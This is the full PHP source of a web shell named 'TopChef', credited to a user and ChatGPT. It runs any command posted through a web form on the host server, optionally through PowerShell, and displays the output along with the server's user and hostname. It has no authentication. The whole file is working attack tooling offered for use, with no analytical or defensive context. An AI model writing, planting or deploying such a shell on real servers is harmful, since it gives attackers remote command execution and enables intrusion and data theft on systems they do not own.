<?php
/*
 * TopChef.php v1.0
 * A cool php webshell. It adds nothing of real value but its cool.
 * Made January 3rd 2024 in Paris by alex4breakme & ChatGPT ^o^
 * alex@break.me - https://break.me
*/

// Runs command but captures the output instead of displaying it
function run_cmd($cmd) {
	ob_start();
	system($cmd);
	return ob_get_clean();
}
$user = run_cmd('whoami');
$hostname = run_cmd('hostname');

// Basic checks for form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	if (isset($_POST['cmd']) && !empty($_POST['cmd'])) {
		$cmd = $_POST['cmd'];
		$powershell_enabled = isset($_POST['powershell']);
		if ($powershell_enabled) {
			$cmd_output = run_cmd("powershell -c " . $cmd);
		} else {
			$cmd_output = run_cmd($cmd);
		}
	} else {
		// Refresh page
		header('Location: ' . $_SERVER['PHP_SELF']);
		exit;
	}

}
// Show username
echo "<h2>Enjoy your webshell as user <span style='color: blue;'>$user</span> on <span style='color: blue;'>$hostname</span></h2>";
?>

<form method="post" id="cmd_form" action="">
    <label for="cmd">Enter command:</label><br/>
    <textarea id="cmd" name="cmd" rows="10" cols="70"></textarea><br/>
    <label for="powershell">Use Powershell (windows only)</label>
    <input type="checkbox" id="powershell" name="powershell" value="1" <?php if ($powershell_enabled) echo "checked"; ?>><br/><br/>
    <input type="submit" value="Submit"><span style="font-style: italic;"> (shift+enter)</span>
</form>
<br/><hr style="width: 33%; margin-left: 0;">
<?php
if (isset($cmd) && !empty($cmd)) {
	echo "<button onclick='copyToClipboard()'>Copy</button><br/>";
	echo "<span style='font-style: italic;'>Command output:</span>";
	echo "<pre id='output'>$cmd_output</pre>";
}
?>
<script>
function copyToClipboard() {
    const preContent = document.getElementById('output');
    navigator.clipboard.writeText(preContent.innerText)
        .then(() => {
            alert('Content copied to clipboard');
        })
        .catch(err => {
            console.error('Error in copying text: ', err);
        });
}

document.getElementById('cmd').addEventListener('keydown', function(event) {
    if (event.key === 'Enter' && event.shiftKey) {
        event.preventDefault(); // Prevent the default action (new line)
        document.getElementById('cmd_form').submit(); // Submit the form
    }
});
</script>
